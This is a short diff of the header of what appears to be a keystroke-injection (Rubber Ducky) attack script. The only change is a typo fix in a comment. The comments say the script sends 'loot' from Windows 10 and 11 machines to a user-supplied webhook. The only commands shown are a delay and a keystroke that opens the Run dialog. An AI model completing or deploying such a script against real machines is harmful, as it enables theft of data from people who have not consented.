@@ -2,7 +2,7 @@ REM Thanks for checking out my projects! Any and all feedback is much appreciate
 REM This code was inspired by The Cyber Mentor on YouTube! I highly recommend his channel https://www.youtube.com/@TCMSecurityAcademy
 REM Disclaimer this code is for educational purposes! DO NOT hack anyone without their permission!
 REM Make sure to change the YOURWEBHOOKHERE to your URL for the webhook where the loot will go.
-REM This code is has been tested and works on both Windows 11 and 10
+REM This code has been tested and works on both Windows 11 and 10
 
 DELAY 1000
 GUI r
